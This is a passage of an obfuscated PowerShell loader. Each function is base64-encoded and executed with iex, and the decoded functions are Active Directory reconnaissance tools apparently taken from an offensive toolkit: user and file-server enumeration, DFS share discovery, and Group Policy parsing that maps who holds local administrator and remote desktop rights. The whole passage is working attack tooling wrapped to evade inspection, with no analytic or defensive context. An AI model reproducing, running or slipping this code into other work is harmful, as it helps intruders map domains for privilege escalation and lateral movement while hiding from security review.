CAgICAgICB9CiAgICB9CiAgICBHZXQtTmV0VXNlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLVBhZ2VTaXplICRQYWdlU2l6ZSB8IFdoZXJlLU9iamVjdCB7JF99IHwgV2hlcmUtT2JqZWN0IHsKICAgICAgICAgICAgaWYoJFRhcmdldFVzZXJzKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0VXNlcnMgLU1hdGNoICRfLnNhbUFjY291bnROYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7ICRUcnVlIH0gCiAgICAgICAgfSB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgaWYoJF8uaG9tZWRpcmVjdG9yeSkgewogICAgICAgICAgICAgICAgU3BsaXRQYXRoKCRfLmhvbWVkaXJlY3RvcnkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJF8uc2NyaXB0cGF0aCkgewogICAgICAgICAgICAgICAgU3BsaXRQYXRoKCRfLnNjcmlwdHBhdGgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJF8ucHJvZmlsZXBhdGgpIHsKICAgICAgICAgICAgICAgIFNwbGl0UGF0aCgkXy5wcm9maWxlcGF0aCkKICAgICAgICAgICAgfQogICAgICAgIH0gfCBXaGVyZS1PYmplY3QgeyRffSB8IFNvcnQtT2JqZWN0IC1VbmlxdWUKfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURGU3NoYXJlIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgiQWxsIiwiVjEiLCIxIiwiVjIiLCIyIildCiAgICAgICAgJFZlcnNpb24gPSAiQWxsIiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgZnVuY3Rpb24gR2V0LURGU3NoYXJlVjEgewogICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgcGFyYW0oCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICREb21haW4sCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkQURTcGF0aCwKICAgICAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgICAgICBbSW50XQogICAgICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICAgICApCiAgICAgICAgJERGU3NlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtQURTcGF0aCAkQURTcGF0aCAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgaWYoJERGU3NlYXJjaGVyKSB7CiAgICAgICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICAgICAgJERGU3NlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDbGFzcz1mVERmcykpIgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJERGU1NlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICRSZW1vdGVOYW1lcyA9ICRQcm9wZXJ0aWVzLnJlbW90ZXNlcnZlcm5hbWUKICAgICAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9ICRSZW1vdGVOYW1lcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICggJF8uQ29udGFpbnMoJ1wnKSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsnTmFtZSc9JFByb3BlcnRpZXMubmFtZVswXTsnUmVtb3RlU2VydmVyTmFtZSc9JF8uc3BsaXQoIlwiKVsyXX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgaW4gcGFyc2luZyBERlMgc2hhcmUgOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJHZXQtREZTc2hhcmVWMiBlcnJvciA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRERlNzaGFyZXMgfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgIlJlbW90ZVNlcnZlck5hbWUiCiAgICAgICAgfQogICAgfQogICAgZnVuY3Rpb24gR2V0LURGU3NoYXJlVjIgewogICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgcGFyYW0oCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICREb21haW4sCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkQURTcGF0aCwKICAgICAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgICAgICBbSW50XQogICAgICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICAgICApCiAgICAgICAgJERGU3NlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtQURTcGF0aCAkQURTcGF0aCAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgaWYoJERGU3NlYXJjaGVyKSB7CiAgICAgICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICAgICAgJERGU3NlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDbGFzcz1tc0RGUy1MaW5rdjIpKSIKICAgICAgICAgICAgJERGU1NlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCdtc2Rmcy1saW5rcGF0aHYyJywnbXNERlMtVGFyZ2V0TGlzdHYyJykpCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkREZTU2VhcmNoZXIuRmluZEFsbCgpIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJFByb3BlcnRpZXMgPSAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9saXN0ID0gJFByb3BlcnRpZXMuJ21zZGZzLXRhcmdldGxpc3R2MidbMF0KICAgICAgICAgICAgICAgICAgICAkeG1sID0gW3htbF1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkdGFyZ2V0X2xpc3RbMi4uKCR0YXJnZXRfbGlzdC5MZW5ndGgtMSldKQogICAgICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gJHhtbC50YXJnZXRzLkNoaWxkTm9kZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0ID0gJF8uSW5uZXJUZXh0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRUYXJnZXQuQ29udGFpbnMoJ1wnKSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkREZTcm9vdCA9ICRUYXJnZXQuc3BsaXQoIlwiKVszXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaGFyZU5hbWUgPSAkUHJvcGVydGllcy4nbXNkZnMtbGlua3BhdGh2MidbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsnTmFtZSc9IiRERlNyb290JFNoYXJlTmFtZSI7J1JlbW90ZVNlcnZlck5hbWUnPSRUYXJnZXQuc3BsaXQoIlwiKVsyXX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgaW4gcGFyc2luZyB0YXJnZXQgOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJHZXQtREZTc2hhcmVWMiBlcnJvciA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRERlNzaGFyZXMgfCBTb3J0LU9iamVjdCAtVW5pcXVlIC1Qcm9wZXJ0eSAiUmVtb3RlU2VydmVyTmFtZSIKICAgICAgICB9CiAgICB9CiAgICAkREZTc2hhcmVzID0gQCgpCiAgICBpZiAoICgkVmVyc2lvbiAtZXEgImFsbCIpIC1vciAoJFZlcnNpb24uZW5kc1dpdGgoIjEiKSkgKSB7CiAgICAgICAgJERGU3NoYXJlcyArPSBHZXQtREZTc2hhcmVWMSAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJEFEU3BhdGggLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgfQogICAgaWYgKCAoJFZlcnNpb24gLWVxICJhbGwiKSAtb3IgKCRWZXJzaW9uLmVuZHNXaXRoKCIyIikpICkgewogICAgICAgICRERlNzaGFyZXMgKz0gR2V0LURGU3NoYXJlVjIgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1BRFNwYXRoICRBRFNwYXRoIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgIH0KICAgICRERlNzaGFyZXMgfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgIlJlbW90ZVNlcnZlck5hbWUiCn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdwdFRtcGwgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdwdFRtcGxQYXRoLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZVBTRHJpdmUKICAgICkKICAgIGJlZ2luIHsKICAgICAgICBpZigkVXNlUFNEcml2ZSkgewogICAgICAgICAgICAkUGFydHMgPSAkR3B0VG1wbFBhdGguc3BsaXQoJ1wnKQogICAgICAgICAgICAkRm9sZGVyUGF0aCA9ICRQYXJ0c1swLi4oJFBhcnRzLmxlbmd0aC0yKV0gLWpvaW4gJ1wnCiAgICAgICAgICAgICRGaWxlUGF0aCA9ICRQYXJ0c1stMV0KICAgICAgICAgICAgJFJhbmREcml2ZSA9ICgiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoiLlRvQ2hhckFycmF5KCkgfCBHZXQtUmFuZG9tIC1Db3VudCA3KSAtam9pbiAnJwogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJNb3VudGluZyBwYXRoICRHcHRUbXBsUGF0aCB1c2luZyBhIHRlbXAgUFNEcml2ZSBhdCAkUmFuZERyaXZlIgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJE51bGwgPSBOZXctUFNEcml2ZSAtTmFtZSAkUmFuZERyaXZlIC1QU1Byb3ZpZGVyIEZpbGVTeXN0ZW0gLVJvb3QgJEZvbGRlclBhdGggIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtRGVidWcgIkVycm9yIG1vdW50aW5nIHBhdGggJEdwdFRtcGxQYXRoIDogJF8iCiAgICAgICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICAkR3B0VG1wbFBhdGggPSAkUmFuZERyaXZlICsgIjpcIiArICRGaWxlUGF0aAogICAgICAgIH0gCiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICAkU2VjdGlvbk5hbWUgPSAnJwogICAgICAgICRTZWN0aW9uc1RlbXAgPSBAe30KICAgICAgICAkU2VjdGlvbnNGaW5hbCA9IEB7fQogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmKFRlc3QtUGF0aCAkR3B0VG1wbFBhdGgpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBhcnNpbmcgJEdwdFRtcGxQYXRoIgogICAgICAgICAgICAgICAgR2V0LUNvbnRlbnQgJEdwdFRtcGxQYXRoIC1FcnJvckFjdGlvbiBTdG9wIHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1xbJykgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbk5hbWUgPSAkXy50cmltKCdbXScpIC1yZXBsYWNlICcgJywnJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJF8gLW1hdGNoICc9JykgewogICAgICAgICAgICAgICAgICAgICAgICAkUGFydHMgPSAkXy5zcGxpdCgnPScpCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eU5hbWUgPSAkUGFydHNbMF0udHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVZhbHVlcyA9ICRQYXJ0c1sxXS50cmltKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFByb3BlcnR5VmFsdWVzIC1tYXRjaCAnLCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVZhbHVlcyA9ICRQcm9wZXJ0eVZhbHVlcy5zcGxpdCgnLCcpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRTZWN0aW9uc1RlbXBbJFNlY3Rpb25OYW1lXSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlY3Rpb25zVGVtcC5BZGQoJFNlY3Rpb25OYW1lLCBAe30pCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJFNlY3Rpb25zVGVtcFskU2VjdGlvbk5hbWVdLkFkZCggJFByb3BlcnR5TmFtZSwgJFByb3BlcnR5VmFsdWVzICkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkU2VjdGlvbiBpbiAkU2VjdGlvbnNUZW1wLmtleXMpIHsKICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbnNGaW5hbFskU2VjdGlvbl0gPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkU2VjdGlvbnNUZW1wWyRTZWN0aW9uXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgJFNlY3Rpb25zRmluYWwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLURlYnVnICJFcnJvciBwYXJzaW5nICRHcHRUbXBsUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KICAgIGVuZCB7CiAgICAgICAgaWYoJFVzZVBTRHJpdmUgLWFuZCAkUmFuZERyaXZlKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlbW92aW5nIHRlbXAgUFNEcml2ZSAkUmFuZERyaXZlIgogICAgICAgICAgICBHZXQtUFNEcml2ZSAtTmFtZSAkUmFuZERyaXZlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgUmVtb3ZlLVBTRHJpdmUKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdyb3Vwc1hNTCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR3JvdXBzWE1MUGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZXNvbHZlU2lkcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VQU0RyaXZlCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYoJFVzZVBTRHJpdmUpIHsKICAgICAgICAgICAgJFBhcnRzID0gJEdyb3Vwc1hNTFBhdGguc3BsaXQoJ1wnKQogICAgICAgICAgICAkRm9sZGVyUGF0aCA9ICRQYXJ0c1swLi4oJFBhcnRzLmxlbmd0aC0yKV0gLWpvaW4gJ1wnCiAgICAgICAgICAgICRGaWxlUGF0aCA9ICRQYXJ0c1stMV0KICAgICAgICAgICAgJFJhbmREcml2ZSA9ICgiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoiLlRvQ2hhckFycmF5KCkgfCBHZXQtUmFuZG9tIC1Db3VudCA3KSAtam9pbiAnJwogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJNb3VudGluZyBwYXRoICRHcm91cHNYTUxQYXRoIHVzaW5nIGEgdGVtcCBQU0RyaXZlIGF0ICRSYW5kRHJpdmUiCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkTnVsbCA9IE5ldy1QU0RyaXZlIC1OYW1lICRSYW5kRHJpdmUgLVBTUHJvdmlkZXIgRmlsZVN5c3RlbSAtUm9vdCAkRm9sZGVyUGF0aCAgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgbW91bnRpbmcgcGF0aCAkR3JvdXBzWE1MUGF0aCA6ICRfIgogICAgICAgICAgICAgICAgcmV0dXJuICROdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEdyb3Vwc1hNTFBhdGggPSAkUmFuZERyaXZlICsgIjpcIiArICRGaWxlUGF0aAogICAgICAgIH0gCiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICBpZihUZXN0LVBhdGggJEdyb3Vwc1hNTFBhdGgpIHsKICAgICAgICAgICAgW3htbF0gJEdyb3Vwc1hNTGNvbnRlbnQgPSBHZXQtQ29udGVudCAkR3JvdXBzWE1MUGF0aAogICAgICAgICAgICAkR3JvdXBzWE1MY29udGVudCB8IFNlbGVjdC1YbWwgIi8vR3JvdXAiIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgbm9kZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRNZW1iZXJzID0gQCgpCiAgICAgICAgICAgICAgICAkTWVtYmVyT2YgPSBAKCkKICAgICAgICAgICAgICAgICRMb2NhbFNpZCA9ICRfLlByb3BlcnRpZXMuR3JvdXBTaWQKICAgICAgICAgICAgICAgIGlmKCEkTG9jYWxTaWQpIHsKICAgICAgICAgICAgICAgICAgICBpZigkXy5Qcm9wZXJ0aWVzLmdyb3VwTmFtZSAtbWF0Y2ggJ0FkbWluaXN0cmF0b3JzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxTaWQgPSAnUy0xLTUtMzItNTQ0JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJF8uUHJvcGVydGllcy5ncm91cE5hbWUgLW1hdGNoICdSZW1vdGUgRGVza3RvcCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsU2lkID0gJ1MtMS01LTMyLTU1NScKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbFNpZCA9ICRfLlByb3BlcnRpZXMuZ3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE1lbWJlck9mID0gQCgkTG9jYWxTaWQpCiAgICAgICAgICAgICAgICAkXy5Qcm9wZXJ0aWVzLm1lbWJlcnMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJF8gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5hY3Rpb24gLW1hdGNoICdBREQnIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRfLnNpZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgKz0gJF8uc2lkCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyArPSAkXy5uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJE1lbWJlcnMgLW9yICRNZW1iZXJvZikgewogICAgICAgICAgICAgICAgICAgICRGaWx0ZXJzID0gJF8uZmlsdGVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBGaWx0ZXIqIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5IEB7J1R5cGUnID0gJF8uTG9jYWxOYW1lOydWYWx1ZScgPSAkXy5uYW1lfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmKCRSZXNvbHZlU2lkcykgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyb2YgPSAkTWVtYmVyb2YgfCBGb3JFYWNoLU9iamVjdCB7Q29udmVydC1TaWRUb05hbWUgJF99CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzID0gJE1lbWJlcnMgfCBGb3JFYWNoLU9iamVjdCB7Q29udmVydC1TaWRUb05hbWUgJF99CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmKCRNZW1iZXJvZiAtaXNub3QgW3N5c3RlbS5hcnJheV0pIHskTWVtYmVyb2YgPSBAKCRNZW1iZXJvZil9CiAgICAgICAgICAgICAgICAgICAgaWYoJE1lbWJlcnMgLWlzbm90IFtzeXN0ZW0uYXJyYXldKSB7JE1lbWJlcnMgPSBAKCRNZW1iZXJzKX0KICAgICAgICAgICAgICAgICAgICAkR1BPUHJvcGVydGllcyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdHUE9EaXNwbGF5TmFtZScgPSAkR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0dQT05hbWUnID0gJEdQT05hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0dQT1BhdGgnID0gJEdyb3Vwc1hNTFBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgJ0ZpbHRlcnMnID0gJEZpbHRlcnMKICAgICAgICAgICAgICAgICAgICAgICAgJ01lbWJlck9mJyA9ICRNZW1iZXJvZgogICAgICAgICAgICAgICAgICAgICAgICAnTWVtYmVycycgPSAkTWVtYmVycwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJEdQT1Byb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIGVuZCB7CiAgICAgICAgaWYoJFVzZVBTRHJpdmUgLWFuZCAkUmFuZERyaXZlKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlbW92aW5nIHRlbXAgUFNEcml2ZSAkUmFuZERyaXZlIgogICAgICAgICAgICBHZXQtUFNEcml2ZSAtTmFtZSAkUmFuZERyaXZlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgUmVtb3ZlLVBTRHJpdmUKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEdQTyB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdQT25hbWUgPSAnKicsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGlzcGxheU5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGJlZ2luIHsKICAgICAgICAkR1BPU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1BRFNwYXRoICRBRFNwYXRoIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIGlmICgkR1BPU2VhcmNoZXIpIHsKICAgICAgICAgICAgaWYoJERpc3BsYXlOYW1lKSB7CiAgICAgICAgICAgICAgICAkR1BPU2VhcmNoZXIuZmlsdGVyPSIoJihvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lcikoZGlzcGxheW5hbWU9JERpc3BsYXlOYW1lKSkiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkR1BPU2VhcmNoZXIuZmlsdGVyPSIoJihvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lcikobmFtZT0kR1BPbmFtZSkpIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRHUE9TZWFyY2hlci5GaW5kQWxsKCkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEdQT0dyb3VwIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR1BPbmFtZSA9ICcqJywKICAgICAgICBbU3RyaW5nXQogICAgICAgICREaXNwbGF5TmFtZSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZXNvbHZlU2lkcywKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZVBTRHJpdmUsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICBHZXQtTmV0R1BPIC1HUE9OYW1lICRHUE9uYW1lIC1EaXNwbGF5TmFtZSAkR1BPbmFtZSAtRG9t